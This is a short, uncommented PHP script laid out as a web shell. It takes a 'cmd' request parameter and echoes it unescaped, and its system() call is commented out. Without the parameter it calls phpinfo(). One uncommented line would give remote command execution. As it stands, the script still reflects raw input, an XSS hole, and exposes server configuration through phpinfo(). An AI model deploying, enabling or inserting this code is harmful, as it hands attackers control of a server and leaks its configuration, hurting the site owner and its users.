<?php 
if(isset($_REQUEST['cmd'])){
        $cmd = ($_REQUEST['cmd']);
        echo $cmd;
        // system($cmd);
} else {
    phpinfo();
}
?>
